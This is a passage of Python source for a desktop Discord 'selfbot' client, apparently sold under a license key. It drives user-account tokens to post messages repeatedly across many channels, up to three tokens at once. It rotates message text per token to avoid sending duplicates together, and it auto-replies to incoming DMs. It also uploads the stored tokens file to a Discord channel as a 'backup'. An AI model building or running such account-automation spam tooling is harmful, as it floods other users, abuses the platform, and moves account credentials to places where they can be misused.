            files = {}
            if os.path.exists(self.TOKENS_FILE):
                files['files[0]'] = (self.TOKENS_FILE, open(self.TOKENS_FILE, 'rb'), 'application/json')
            if os.path.exists(self.CHANNELS_FILE):
                files['files[1]'] = (self.CHANNELS_FILE, open(self.CHANNELS_FILE, 'rb'), 'application/json')
            if not files:
                return
            payload_json = json.dumps({"content": "Selfbot backup upload", "flags": 0})
            data = {"payload_json": payload_json}
            url = f"https://discord.com/api/v10/channels/{self.backup_channel_id}/messages"
            r = self._discord_request("POST", url, data=data, files=files)
            # Ensure files are closed
            for f in files.values():
                try:
                    f[1].close()
                except Exception:
                    pass
            if r.status_code not in (200, 201):
                raise RuntimeError(f"HTTP {r.status_code}: {r.text[:200]}")
        except Exception as e:
            raise

    def restore_from_discord_backup(self):
        """Fetch the latest message with both tokens.json and channels.json attachments and restore locally."""
        try:
            url = f"https://discord.com/api/v10/channels/{self.backup_channel_id}/messages?limit=25"
            r = self._discord_request("GET", url)
            if r.status_code != 200:
                raise RuntimeError(f"HTTP {r.status_code}: {r.text[:200]}")
            msgs = r.json() if isinstance(r.json(), list) else []
            latest = None
            for m in msgs:
                atts = m.get('attachments', []) or []
                names = [a.get('filename','') for a in atts]
                if (self.TOKENS_FILE in names) or (self.CHANNELS_FILE in names):
                    latest = m
                    break
            if not latest:
                return
            # Download attachments we care about
            for att in latest.get('attachments', []) or []:
                fname = att.get('filename') or ''
                url = att.get('url') or ''
                if fname in (self.TOKENS_FILE, self.CHANNELS_FILE) and url:
                    try:
                        rr = requests.get(url, timeout=20)
                        if rr.status_code == 200:
                            with open(fname, 'wb') as f:
                                f.write(rr.content)
                    except Exception:
                        pass
        except Exception as e:
            raise

    # -------- Token Change & User Info Fetch --------
    def on_token_change(self):
        token_name = self.token_var.get()
        if token_name in self.tokens:
            self.selected_token_name = token_name
            token = self.tokens[token_name]
            threading.Thread(target=self.fetch_and_display_user_info, args=(token,), daemon=True).start()
        else:
            self.selected_token_name = None
            self.clear_user_info()

    def clear_user_info(self):
        self.avatar_label.config(image="")
        self.username_label.config(text="")

    def fetch_and_display_user_info(self, token):
        try:
            headers = {"Authorization": token}
            r = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=6)
            if r.status_code != 200:
                self.clear_user_info()
                return
            user = r.json()
            username = f"{user.get('username','')}#{user.get('discriminator','')}"
            avatar_hash = user.get("avatar")
            user_id = user.get("id")
            if avatar_hash:
                ext = "gif" if avatar_hash.startswith("a_") else "png"
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.{ext}?size=128"
            else:
                discriminator_mod = int(user['discriminator']) % 5
                avatar_url = f"https://cdn.discordapp.com/embed/avatars/{discriminator_mod}.png"

            response = requests.get(avatar_url)
            if response.status_code == 200:
                image_data = response.content
                image = Image.open(io.BytesIO(image_data)).resize((64, 64))
                photo = ImageTk.PhotoImage(image)
                self.avatar_label.image = photo
                self.avatar_label.config(image=photo)
            else:
                self.avatar_label.config(image="")

            self.username_label.config(text=username)
            # Cache for later echo in chat
            try:
                self._me_username = username
                self._me_avatar_url = avatar_url
            except Exception:
                pass
            # Save for chat echo and prefetch chat-sized avatar
            try:
                self._me_username = username
                self._me_avatar_url = avatar_url
                threading.Thread(target=self._fetch_avatar, args=(avatar_url,), daemon=True).start()
            except Exception:
                pass
            # Terminal-style welcome (once)
            try:
                if not getattr(self, "_welcomed", False):
                    self._welcomed = True
                    self.root.after(100, lambda u=username: self._show_terminal_welcome(u))
            except Exception:
                pass
        except Exception:
            self.clear_user_info()

    # ===== eDEX Terminal Welcome Overlay =====
    def _ensure_terminal_overlay(self):
        try:
            if getattr(self, "_welcome_overlay", None) is not None:
                return
            # Make outside color the same as inside of the box
            self._welcome_overlay = tk.Frame(self.root, bg="#0b1020")
            self._welcome_overlay.place(relx=0, rely=0, relwidth=1, relheight=1)
            self._welcome_overlay.lower(self.bg_canvas)
            self._welcome_overlay.lift()
            self._welcome_overlay.configure(bg="#0b1020")
            # Container for the main (big) box
            self._welcome_panel = tk.Frame(self._welcome_overlay, bg="#0b1020")
            self._welcome_panel.place(relx=0.5, rely=0.4, anchor="center")
            # Single canvas representing the big box (no inner/smaller box)
            try:
                self._welcome_canvas = tk.Canvas(self._welcome_panel, width=540, height=160, bg="#0b1020", highlightthickness=0)
                self._welcome_canvas.pack(padx=18, pady=(18, 8))
                # No outer glow/border on the main canvas per request
            except Exception:
                self._welcome_canvas = None
            # Prepare a label for text; it will be placed inside the canvas later
            self._welcome_term = tk.Label(self._welcome_panel, text="", bg="#0b1020", fg="#9ab0ff", font=("Consolas", 13))
        except Exception:
            pass

    def _show_terminal_welcome(self, username: str):
        try:
            self._ensure_terminal_overlay()
            term = self._welcome_term
            # Draw animated outline on the big canvas (no inner small box)
            try:
                c = getattr(self, "_welcome_canvas", None)
                if c is not None:
                    c.update_idletasks()
                    w = int(c.winfo_width() or 540)
                    h = int(c.winfo_height() or 160)
                    pad = 8
                    x1, y1 = pad, pad
                    x2, y2 = w - pad, h - pad
                    color = "#7d5fff"
                    width = 3
                    # Four line objects start as zero-length
                    top = c.create_line(x1, y1, x1, y1, fill=color, width=width)
                    right = c.create_line(x2, y1, x2, y1, fill=color, width=width)
                    bottom = c.create_line(x2, y2, x2, y2, fill=color, width=width)
                    left = c.create_line(x1, y2, x1, y2, fill=color, width=width)
                    steps = 30
                    delay_ms = 16
                    def animate(step=0):
                        try:
                            f = step / float(steps)
                            # top grows L->R
                            tx = x1 + int((x2 - x1) * min(1.0, f))
                            c.coords(top, x1, y1, tx, y1)
                            # right grows T->B after 25%
                            rf = max(0.0, f - 0.25) / 0.75
                            ry = y1 + int((y2 - y1) * max(0.0, min(1.0, rf)))
                            c.coords(right, x2, y1, x2, ry)
                            # bottom grows R->L after 50%
                            bf = max(0.0, f - 0.5) / 0.5
                            bx = x2 - int((x2 - x1) * max(0.0, min(1.0, bf)))
                            c.coords(bottom, x2, y2, bx, y2)
                            # left grows B->T after 75%
                            lf = max(0.0, f - 0.75) / 0.25
                            ly = y2 - int((y2 - y1) * max(0.0, min(1.0, lf)))
                            c.coords(left, x1, y2, x1, ly)
                            if step < steps:
                                self.root.after(delay_ms, lambda: animate(step + 1))
                            else:
                                # Type 'awaiting session ...' on the canvas after 1 second, then continue after 0.6s with the rest
                                def _type_canvas_text(text: str, idx: int = 0, on_complete=None):
                                    try:
                                        c.delete('text')
                                        cx = (x1 + x2) // 2
                                        cy = (y1 + y2) // 2
                                        c.create_text(cx, cy, text=text[:idx], fill="#9ab0ff", font=("Consolas", 13), tags=('text',))
                                        if idx < len(text):
                                            self.root.after(30, lambda: _type_canvas_text(text, idx + 1, on_complete))
                                        else:
                                            if on_complete:
                                                on_complete()
                                    except Exception:
                                        pass

                                def _type_canvas_lines(lines: list[str], li: int = 0, ci: int = 0):
                                    try:
                                        # Build current typed text across lines
                                        typed = []
                                        for i in range(li):
                                            typed.append(lines[i])
                                        typed.append(lines[li][:ci])
                                        text_block = "\n".join(typed)
                                        c.delete('text')
                                        cx = (x1 + x2) // 2
                                        cy = (y1 + y2) // 2
                                        c.create_text(cx, cy, text=text_block, fill="#9ab0ff", font=("Consolas", 13), tags=('text',), justify='center')
                                        if ci < len(lines[li]):
                                            self.root.after(30, lambda: _type_canvas_lines(lines, li, ci + 1))
                                        else:
                                            if li + 1 < len(lines):
                                                self.root.after(150, lambda: _type_canvas_lines(lines, li + 1, 0))
                                            else:
                                                # Keep Welcome visible longer before opening UI
                                                try:
                                                    self.root.after(2000, _finish)
                                                except Exception:
                                                    pass
                                    except Exception:
                                        pass

                                def _after_awaiting():
                                    # After 0.6s, type the remaining lines
                                    self.root.after(600, lambda: _type_canvas_lines([
                                        "> initializing KS terminal ...",
                                        "> starting KS Bot ...",
                                        f"> Welcome, {username}"
                                    ]))

                                self.root.after(1000, lambda: _type_canvas_text("> awaiting session ...", 0, _after_awaiting))
                        except Exception:
                            pass
                    def start_typing():
                        try:
                            lines = [
                                "> initializing KS terminal ...",
                                "> starting KS Bot ...",
                                f"> Welcome, {username}"
                            ]
                            self._type_lines(term, lines)
                        except Exception:
                            pass
                    animate(0)
                else:
                    # Fallback: use label typing then proceed
                    tmp = tk.Label(self._welcome_panel, text="", bg="#0b1020", fg="#9ab0ff", font=("Consolas", 13))
                    tmp.pack(pady=(4, 2))
                    def _after_aw():
                        # After 0.6s, type remaining lines and then open after computed delay
                        seq = ["> initializing KS terminal ...", "> starting KS Bot ...", f"> Welcome, {username}"]
                        self.root.after(600, lambda: self._type_lines(tmp, seq))
                        init_len = len(seq[0])
                        start_len = len(seq[1])
                        welcome_len = len(seq[2])
                        # typing time: 30ms per char, 150ms between lines, plus 2000ms hold
                        finish_delay = 600 + (init_len * 30) + 150 + (start_len * 30) + 150 + (welcome_len * 30) + 2000
                        self.root.after(finish_delay, _finish)
                    self.root.after(1000, lambda: self._type_lines(tmp, ["> awaiting session ..."]))
                    self.root.after(1000 + int(len("> awaiting session ...") * 30) + 50, _after_aw)
            except Exception:
                pass
            def _finish():
                try:
                    self._welcome_overlay.destroy()
                    self._welcome_overlay = None
                except Exception:
                    pass
                def _show_main():
                    try:
                        self.main_frame.place(**self._mf_place_args)
                    except Exception:
                        pass
                self.root.after(1500, _show_main)
            # Removed fixed overlay timeout; closing is scheduled after typing completes
        except Exception:
            pass

    def _type_lines(self, label: tk.Label, lines: list[str], line_idx: int = 0, char_idx: int = 0):
        try:
            typed_lines = []
            for i in range(line_idx):
                typed_lines.append(lines[i])
            current_line = lines[line_idx]
            typed_lines.append(current_line[:char_idx])
            label.config(text="\n".join(typed_lines))
            if char_idx < len(current_line):
                self.root.after(30, lambda: self._type_lines(label, lines, line_idx, char_idx + 1))
            else:
                if line_idx + 1 < len(lines):
                    self.root.after(150, lambda: self._type_lines(label, lines, line_idx + 1, 0))
        except Exception:
            pass

    # -------- Logging --------
    def log(self, message):
        self.log_text.configure(state=tk.NORMAL)
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.see(tk.END)
        self.log_text.configure(state=tk.DISABLED)

    # -------- Sending messages logic --------
    def start_sending(self):
        if self.send_running:
            self.log("⚠️ Already sending messages.")
            return
        token_name = self.token_var.get()
        if token_name not in self.tokens and not any(var.get() for var in getattr(self, 'multi_token_vars', {}).values()):
            self.log("❌ Please select at least one token.")
            return
        selected_channels = [name for name, var in self.channel_vars.items() if var.get()]
        if not selected_channels:
            self.log("❌ Please select at least one channel to send messages.")
            return

        message = self.message_entry.get("1.0", "end").strip()
        if not message:
            self.log("❌ Message content cannot be empty.")
            return

        try:
            delay = float(self.delay_entry.get())
            if delay < 0:
                raise ValueError
        except:
            self.log("❌ Invalid delay value.")
            return

        # Loop count (0 = infinite)
        try:
            loop_count = int(self.loop_count_entry.get()) if hasattr(self, 'loop_count_entry') else 1
            if loop_count < 0:
                loop_count = 0
        except Exception:
            loop_count = 1

        self.selected_channel_names = selected_channels
        self.send_running = True

        # Button color states
        try:
            self.btn_start.configure(bg="#22c55e")  # green
            self.btn_pause.configure(bg="#5a3e99")
            self.btn_restart.configure(bg="#5a3e99")
        except Exception:
            pass
        
        # Build selected tokens list (max 3)
        selected_token_names = []
        for name, var in getattr(self, 'multi_token_vars', {}).items():
            if var.get():
                selected_token_names.append(name)
        if not selected_token_names and token_name in self.tokens:
            selected_token_names = [token_name]
        if len(selected_token_names) > 3:
            selected_token_names = selected_token_names[:3]

        # Assign rotator indices per token to avoid same content simultaneously
        self._per_token_rotator_offsets = {name: idx for idx, name in enumerate(selected_token_names)}

        # Stagger token starts according to rotator token switch delay
        try:
            token_switch_delay = float(self.rotator_token_delay_entry.get()) if hasattr(self, 'rotator_token_delay_entry') else 0.0
        except Exception:
            token_switch_delay = 0.0
        for idx, name in enumerate(selected_token_names):
            tok = self.tokens.get(name)
            def _launch(n=name, t=tok):
                threading.Thread(target=self.send_messages_loop,
                                 args=(t, self.selected_channel_names, message, delay, loop_count, n),
                                 daemon=True).start()
            self.root.after(int(max(0.0, token_switch_delay) * 1000 * idx), _launch)
        self.log(f"▶️ Started sending with {len(selected_token_names)} token(s).")

    def send_messages_loop(self, token, channel_names, message, delay, loop_count, token_name=None):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json"
        }
        count = 0
        while self.send_running and (loop_count == 0 or count < loop_count):
            for channel_name in channel_names:
                if not self.send_running:
                    break
                channel_id = self.channels.get(channel_name)
                if not channel_id:
                    self.log(f"❌ Channel '{channel_name}' ID not found.")
                    continue

                url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
                try:
                    # Choose content from rotator if enabled, using per-token offset to avoid duplicates
                    if self.rotator_enabled_var.get() and self.rotator_messages:
                        msgs = self.rotator_messages[:]
                        random.shuffle(msgs)
                        if token_name is not None:
                            base_index = getattr(self, 'rotator_index', 0)
                            offset = getattr(self, '_per_token_rotator_offsets', {}).get(token_name, 0)
                            content_to_send = msgs[(base_index + offset) % len(msgs)]
                            # Only advance base index once per full round (handled below after each channel)
                        else:
                            content_to_send = msgs[getattr(self, 'rotator_index', 0) % len(msgs)]
                    else:
                        content_to_send = message
                    resp = requests.post(url, headers=headers, json={"content": content_to_send})
                    if resp.status_code in (200, 201):
                        self.log(f"✅ Message sent to channel '{channel_name}'.")
                        self.message_counter_total += 1
                        self._update_stats_label()
                        try:
                            self.increment_message_stats(token)
                        except Exception:
                            pass
                    else:
                        self.log(f"❌ Failed to send to '{channel_name}': HTTP {resp.status_code}")
                except Exception as e:
                    self.log(f"❌ Error sending to '{channel_name}': {e}")

                # After each channel for this token, advance the shared rotator index exactly once
                try:
                    if self.rotator_enabled_var.get() and self.rotator_messages and token_name is not None:
                        self.rotator_index = (self.rotator_index + 1) % max(1, len(self.rotator_messages))
                except Exception:
                    pass
                time.sleep(delay)
            count += 1
        self.send_running = False
        self.log("⏹️ Sending messages stopped.")

    def pause_resume_sending(self):
        if not self.send_running:
            self.log("⚠️ Not currently sending messages.")
            return
        self.send_running = not self.send_running
        status = "Resumed" if self.send_running else "Paused"
        self.log(f"ℹ️ {status} sending messages.")
        try:
            if self.send_running:
                self.btn_start.configure(bg="#22c55e")
                self.btn_pause.configure(bg="#5a3e99")
            else:
                self.btn_pause.configure(bg="#eab308")  # yellow
        except Exception:
            pass

    def stop_sending(self):
        if not self.send_running:
            self.log("⚠️ Not currently sending messages.")
            return
        self.send_running = False
        self.log("🛑 Stopped sending messages.")
        try:
            self.btn_restart.configure(bg="#ef4444")  # red
            self.btn_start.configure(bg="#5a3e99")
            self.btn_pause.configure(bg="#5a3e99")
        except Exception:
            pass

    def _restart_sending(self):
        self.stop_sending()
        # brief tick to allow UI to update
        self.root.after(150, self.start_sending)

    # -------- DM Reply Logic --------
    def toggle_reply_dm(self):
        if self.auto_reply_running:
            self.auto_reply_running = False
            self.reply_dm_button.config(text="Start Reply DM")
            self.log("ℹ️ Stopped Reply DM loop.")
        else:
            token_name = self.token_var.get()
            if token_name not in self.tokens:
                self.log("❌ Please select a valid token.")
                return
            message = self.reply_dm_entry.get("1.0", "end").strip()
            if not message:
                self.log("❌ Reply DM message cannot be empty.")
                return
            try:
                delay = float(self.reply_delay_entry.get())
                if delay < 0:
                    raise ValueError()
            except ValueError:
                self.log("❌ Invalid delay value, must be a positive number.")
                return

            self.auto_reply_running = True
            self.reply_dm_button.config(text="Stop Reply DM")
            threading.Thread(target=self.dm_reply_loop, args=(self.tokens[token_name], message, delay), daemon=True).start()
            self.log("▶️ Started Reply DM loop.")

    def dm_reply_loop(self, token, reply_message, delay=8):
        import asyncio
        import requests
        import websockets
        import json as jsjson
        import time

        API_BASE = "https://discord.com/api/v10"
        headers = {
            "Authorization": token,
            "Content-Type": "application/json"
        }
        replied_users = set()

        async def heartbeat(ws, interval):
            while True:
                await asyncio.sleep(interval / 1000)
                await ws.send(jsjson.dumps({"op": 1, "d": None}))

        async def run_gateway():
            gateway_url = "wss://gateway.discord.gg/?v=10&encoding=json"
            try:
                async with websockets.connect(gateway_url, max_size=2 ** 23) as ws:
                    hello = jsjson.loads(await ws.recv())
                    heartbeat_interval = hello['d']['heartbeat_interval']
                    asyncio.create_task(heartbeat(ws, heartbeat_interval))

                    identify_payload = {
                        "op": 2,
                        "d": {
                            "token": token,
                            "properties": {
                                "$os": "windows",
                                "$browser": "selfbot",
                                "$device": "selfbot"
                            },
                            "presence": {"status": "online"},
                            "compress": False,
                            "large_threshold": 50
                        }
                    }
                    await ws.send(jsjson.dumps(identify_payload))
                    self.log("✅ Connected to Discord Gateway")

                    my_user_id = None

                    while self.auto_reply_running:
                        try:
                            msg = await ws.recv()
                            event = jsjson.loads(msg)

                            if event.get("t") == "READY" and my_user_id is None:
                                my_user_id = event["d"]["user"]["id"]
                                self.log(f"🧠 Logged in as {my_user_id}")

                            if event.get("t") == "MESSAGE_CREATE":
                                msg_data = event["d"]
                                channel_id = msg_data["channel_id"]
                                author_id = msg_data["author"]["id"]

                                if author_id == my_user_id:
                                    continue

                                r = requests.get(f"{API_BASE}/channels/{channel_id}", headers=headers)
                                if r.status_code != 200:
                                    continue
                                channel_info = r.json()

                                if channel_info.get("type") == 1:  # DM channel
                                    if author_id not in replied_users:
                                        self.log(f"📩 New DM from {author_id}, replying in {delay} seconds...")
                                        try:
                                            time.sleep(delay)  # wait before replying
                                            send_resp = requests.post(
                                                f"{API_BASE}/channels/{channel_id}/messages",
                                                headers=headers,
                                                json={"content": reply_message}
                                            )
                                            if send_resp.status_code in (200, 201):
                                                self.log(f"✅ Replied to DM from {author_id}.")
                                                replied_users.add(author_id)
                                                # Count only selfbot-sent messages
                                                self.increment_message_stats(token)
                                                # Also report to central bot
                                                try:
                                                    uid = self._get_user_id_for_token(token)
                                                    if uid:
                                                        requests.post(f"{SERVICE_URL}/api/stat-incr", data={"user_id": uid}, timeout=5)
                                                except Exception:
                                                    pass
                                            else:
                                                self.log(f"❌ Failed to reply DM: {send_resp.status_code}")
                                        except Exception as e:
                                            self.log(f"❌ Exception sending DM reply: {e}")

                        except Exception as e:
                            self.log(f"❌ WebSocket Error: {e}")
                            await asyncio.sleep(5)

            except Exception as e:
                self.log(f"❌ Could not connect to Discord Gateway: {e}")

        asyncio.run(run_gateway())

    # -------- Chat helpers --------
    def chat_poll_loop(self):
        while True:
            try:
                mid = machine_id()
                uid = self._me_user_id or ''
                r = requests.get(f"{SERVICE_URL}/api/chat-poll", params={"since": str(self.chat_last_ts), "user_id": uid}, timeout=8)
                if r.status_code == 200:
                    j = r.json()
                    self.chat_can_send = bool(j.get("can_send"))
                    msgs = j.get("messages", [])
                    if msgs:
                        for m in msgs:
                            ts = int(m.get("ts", 0) or 0)
                            self.chat_last_ts = max(self.chat_last_ts, ts)
                            self._chat_items.append(m)
                        try:
                            self._save_chat_history_local()
                        except Exception:
                            pass
                        # Redraw after batching
                        try:
                            self._draw_chat_items()
                        except Exception:
                            pass
                time.sleep(2)
            except Exception:
                time.sleep(3)

    def _on_chat_scroll(self, event):
        try:
            delta = -1 * int(event.delta/120)
        except Exception:
            delta = 1
        self._chat_scroll_y = max(0, self._chat_scroll_y + delta*24)
        self._draw_chat_items()

    def _draw_chat_items(self):
        if not hasattr(self, '_chat_canvas'):
            return
        c = self._chat_canvas
        # Clear previous chat drawings but keep background glow items
        for item in getattr(self, '_chat_fg_items', []):
            try:
                c.delete(item)
            except Exception:
                pass
        self._chat_fg_items = []
        x_pad = 16
        y_pad = 16
        w = c.winfo_width() or 300
        y = y_pad - self._chat_scroll_y
        for m in self._chat_items[-200:]:
            try:
                ts = int(m.get('ts', 0) or 0)
                content = str(m.get('content', ''))
                username = str(m.get('username') or m.get('from') or '')
                avatar_url = str(m.get('avatar_url') or '')
                time_txt = datetime.fromtimestamp(ts).strftime('%H:%M:%S') if ts else ''
                # Avatar: draw cached image if available, else placeholder and trigger fetch
                r = 14
                if avatar_url and avatar_url in self._avatar_cache:
                    img = self._avatar_cache.get(avatar_url)
                    if img:
                        self._chat_fg_items.append(c.create_image(x_pad+r, y+r, image=img))
                    else:
                        self._chat_fg_items.append(c.create_oval(x_pad, y, x_pad+2*r, y+2*r, outline='#5a3e99', fill='#2c2750'))
                else:
                    self._chat_fg_items.append(c.create_oval(x_pad, y, x_pad+2*r, y+2*r, outline='#5a3e99', fill='#2c2750'))
                    if avatar_url and (avatar_url not in self._avatar_missing):
                        threading.Thread(target=self._fetch_avatar, args=(avatar_url,), daemon=True).start()
                # Username and time
                self._chat_fg_items.append(c.create_text(x_pad+2*r+8, y+6, anchor='nw', fill='#e0d7ff', font=('Segoe UI', 10, 'bold'), text=username))
                self._chat_fg_items.append(c.create_text(w-20, y+6, anchor='ne', fill='#7d5fff', font=('Consolas', 9), text=time_txt))
                # Message content (wrap at width) with clickable URLs
                maxw = w - (x_pad+2*r+8) - 20
                yy = y + 2*r + 6
                url_re = re.compile(r"https?://\S+")
                def _open(url: str):
                    try:
                        webbrowser.open(url)
                    except Exception:
                        pass
                # Render with simple wrap
                words = content.split(' ')
                line = ''
                for word in words:
                    test = (line + ' ' + word).strip()
                    if len(test) > 48:
                        self._chat_fg_items.append(c.create_text(x_pad+2*r+8, yy, anchor='nw', fill='#e0d7ff', font=('Segoe UI', 10), text=line))
                        yy += 16
                        line = word
                    else:
                        line = test
                if line:
                    x_cursor = x_pad+2*r+8
                    idx = 0
                    for murl in url_re.finditer(line):
                        pre = line[idx:murl.start()]
                        if pre:
                            self._chat_fg_items.append(c.create_text(x_cursor, yy, anchor='nw', fill='#e0d7ff', font=('Segoe UI', 10), text=pre))
                            x_cursor += int(len(pre) * 7.0)
                        urltxt = murl.group(0)
                        item = c.create_text(x_cursor, yy, anchor='nw', fill='#7d5fff', font=('Segoe UI', 10, 'underline'), text=urltxt)
                        self._chat_fg_items.append(item)
                        c.tag_bind(item, '<Button-1>', lambda e, u=urltxt: _open(u))
                        x_cursor += int(len(urltxt) * 7.0)
                        idx = murl.end()
                    tail = line[idx:]
                    if tail:
                        self._chat_fg_items.append(c.create_text(x_cursor, yy, anchor='nw', fill='#e0d7ff', font=('Segoe UI', 10), text=tail))
                    yy += 16
                y = yy + 10
            except Exception:
                continue
        # Ensure min height
        c.configure(scrollregion=(0,0,w,max(y, c.winfo_height())))

    def _fetch_avatar(self, url: str):
        try:
            rr = requests.get(url, timeout=8)
            if rr.status_code == 200:
                from PIL import Image, ImageTk
                import io as _io
                img = Image.open(_io.BytesIO(rr.content)).resize((28, 28))
                # Make circular mask
                mask = Image.new('L', (28,28), 0)
                from PIL import ImageDraw as _ImageDraw
                _ImageDraw.Draw(mask).ellipse((0,0,28,28), fill=255)
                img.putalpha(mask)
                tk_img = ImageTk.PhotoImage(img)
                self._avatar_cache[url] = tk_img
                # Redraw on UI thread
                try:
                    self.root.after(0, self._draw_chat_items)
                except Exception:
                    pass
            else:
                self._avatar_missing.add(url)
        except Exception:
            self._avatar_missing.add(url)

    def chat_send_message(self):
        msg = self.chat_entry.get().strip()
        if not msg:
            return
        if msg.strip().startswith("/leaderboard"):
            self.show_leaderboard()
            return
        # Try to send; rely on server to enforce permissions and report errors
        try:
            # Resolve user info for echo if cache missing
            if not getattr(self, '_me_user_id', None) or not getattr(self, '_me_username', None) or not getattr(self, '_me_avatar_url', None):
                uid_res, uname_res, aurl_res = self._resolve_me_user(self.user_token)
                if uid_res:
                    self._me_user_id = uid_res
                if uname_res:
                    self._me_username = uname_res
                if aurl_res:
                    self._me_avatar_url = aurl_res
            uid = self._me_user_id or ''
            r = requests.post(f"{SERVICE_URL}/api/chat-post", data={"content": msg, "user_id": uid}, timeout=8)
            if r.status_code == 200:
                self.chat_entry.delete(0, "end")
                # Echo locally as a rich item with our username and avatar
                ts = int(time.time())
                self.chat_last_ts = max(self.chat_last_ts, ts)
                uname = getattr(self, '_me_username', 'me')
                aurl = getattr(self, '_me_avatar_url', '')
                self._chat_items.append({'ts': ts, 'username': uname, 'avatar_url': aurl, 'content': msg})
                try:
                    self._save_chat_history_local()
                except Exception:
                    pass
                # Mirror to webhook (best-effort, non-blocking)
                try:
                    if CHAT_MIRROR_WEBHOOK:
                        threading.Thread(target=lambda u=uname, m=msg: requests.post(CHAT_MIRROR_WEBHOOK, json={"content": f"[{u}] {m}"}, timeout=5), daemon=True).start()
                except Exception:
                    pass
                self._draw_chat_items()
            else:
                try:
                    err = r.text.strip()
                except Exception:
                    err = f"HTTP {r.status_code}"
                self.log(f"Chat post failed: {err}")
        except Exception as e:
            self.log(f"Chat error: {e}")

    # -------- Sound --------
    def play_opening_sound(self):
        try:
            sound_file = os.getenv("STARTUP_SOUND", "opening_sound.wav")
            if os.path.exists(sound_file):
                pygame.mixer.music.load(sound_file)
                pygame.mixer.music.play()
        except Exception:
            pass

    # ------- On close --------
    def on_close(self):
        self.send_running = False
        self.auto_reply_running = False
        self.root.destroy()

    def _start_expiry_watchdog(self):
        def _tick():
            try:
                uid = str(self._login_user_id)
                resp = requests.get(f"{SERVICE_URL}/api/member-status", params={"user_id": uid, "machine_id": machine_id()}, timeout=5)
                ok = (resp.status_code == 200)
                j = resp.json() if ok else {}
                should = bool(j.get("should_have_access", False))
                if not should:
                    # Close the app when access is gone
                    self.root.after(0, self.root.destroy)
                    return
            except Exception:
                pass
            # Re-run in 30 seconds
            self.root.after(30000, _tick)
        # kick off
        self.root.after(30000, _tick)

    # -------- Message Rotator helpers --------
    def _rotator_add(self):
        txt = self.rotator_input.get().strip()
        if not txt:
            return
        self.rotator_messages.append(txt)
        try:
            self.rotator_list.insert(tk.END, txt)
        except Exception:
            pass
        self.rotator_input.delete(0, tk.END)
        # persist
        try:
            with open(self.ROTATOR_FILE, "w", encoding="utf-8") as f:
                for ln in self.rotator_messages:
                    f.write(ln + "\n")
        except Exception:
            pass

    def _rotator_remove(self):
        try:
            sel = list(self.rotator_list.curselection())
        except Exception:
            sel = []
        if not sel:
            return
        idx = sel[0]
        if 0 <= idx < len(self.rotator_messages):
            self.rotator_messages.pop(idx)
        try:
            self.rotator_list.delete(idx)
        except Exception:
            pass
        self.rotator_index = 0 if not self.rotator_messages else min(self.rotator_index, len(self.rotator_messages) - 1)
        # persist
        try:
            with open(self.ROTATOR_FILE, "w", encoding="utf-8") as f:
                for ln in self.rotator_messages:
                    f.write(ln + "\n")
        except Exception:
            pass

    def _rotator_clear(self):
        self.rotator_messages.clear()
        self.rotator_index = 0
        try:
            self.rotator_list.delete(0, tk.END)
        except Exception:
            pass
        # persist
        try:
            open(self.ROTATOR_FILE, "w", encoding="utf-8").close()
        except Exception:
            pass

    def _rotator_next(self) -> str:
        if not self.rotator_messages:
            return ""
        val = self.rotator_messages[self.rotator_index % len(self.rotator_messages)]
        self.rotator_index = (self.rotator_index + 1) % max(1, len(self.rotator_messages))
        return val

    def ann_poll_loop(self):
        self.ann_last_ts = 0
        while True:
            try:
                r = requests.get(f"{SERVICE_URL}/api/ann-poll", params={"since": str(self.ann_last_ts)}, timeout=8)
                if r.status_code == 200:
                    j = r.json()
                    msgs = j.get("messages", [])
                    if msgs:
                        self.ann_last_ts = max(self.ann_last_ts, max(int(m.get('ts',0) or 0) for m in msgs))
                        try:
                            self._save_announcements_local(msgs)
                        except Exception:
                            pass
                        self.root.after(0, lambda m=msgs: self._append_announcements(m))
                time.sleep(6)
            except Exception:
                time.sleep(8)

    def _append_announcements(self, msgs):
        try:
            self.ann_text.configure(state=tk.NORMAL)
            for m in msgs[-10:]:
                ts = int(m.get('ts',0) or 0)
                content = m.get('content','')
                uname = m.get('username') or ''
                if uname:
                    line = f"[{datetime.fromtimestamp(ts).strftime('%H:%M')}] {uname}: {content}\n"
                else:
                    line = f"[{datetime.fromtimestamp(ts).strftime('%H:%M')}] {content}\n"
                self.ann_text.insert('end', line)
            self.ann_text.configure(state=tk.DISABLED)
            self.ann_text.see('end')
        except Exception:
            pass

    def ann_send_message(self):
        msg = self.ann_box.get("1.0", "end").strip()
        if not msg:
            return
        # Try to post announcement; rely on server to enforce owner permission
        try:
            # Ensure we have our user id resolved so the server can authorize
            if not getattr(self, '_me_user_id', None):
                try:
                    uid_res, _, _ = self._resolve_me_user(self.user_token)
                    if uid_res:
                        self._me_user_id = uid_res
                except Exception:
                    pass
            uid = self._me_user_id or ''
            r = requests.post(f"{SERVICE_URL}/api/ann-post", data={"content": msg, "user_id": uid}, timeout=8)
            if r.status_code == 200:
                self.ann_box.delete("1.0", "end")
                try:
                    # Save locally for persistence
                    now_ts = int(time.time())
                    self._save_announcements_local([{'ts': now_ts, 'content': msg, 'username': ''}])
                    # Also reflect in UI immediately
                    self.ann_text.configure(state=tk.NORMAL)
                    self.ann_text.insert('end', f"[{datetime.fromtimestamp(now_ts).strftime('%H:%M')}] {msg}\n")
                    self.ann_text.configure(state=tk.DISABLED)
                    self.ann_text.see('end')
                except Exception:
                    pass
            else:
                self.log(f"Announcement post failed: HTTP {r.status_code}")
        except Exception as e:
            self.log(f"Announcement post error: {e}")

    def _start_key_duration_updater(self):
        def _tick():
            try:
                uid = str(self._login_user_id or self.user_id or '')
                if not uid:
                    raise RuntimeError('no uid')
                resp = requests.get(
                    f"{SERVICE_URL}/api/member-status",
                    params={"user_id": uid, "machine_id": machine_id()},
                    timeout=5
                )
                if resp.status_code == 200:
                    j = resp.json() or {}
                    should = bool(j.get('should_have_access', False))
                    act = j.get('active_keys') or []
                    remaining = 0
                    if act:
                        try:
                            remaining = int(act[0].get('time_remaining', 0) or 0)
                        except Exception:
                            remaining = 0
                    if remaining <= 0 and (not should):
                        try:
                            self.key_duration_value.config(text="expired")
                        except Exception:
                            pass
                        # Close UI if access gone
                        try:
                            self.root.after(500, self.root.destroy)
                        except Exception:
                            pass
                        return
                    # Lifetime heuristic: > 10 years
                    if remaining > 10*365*86400:
                        txt = "infinite"
                    else:
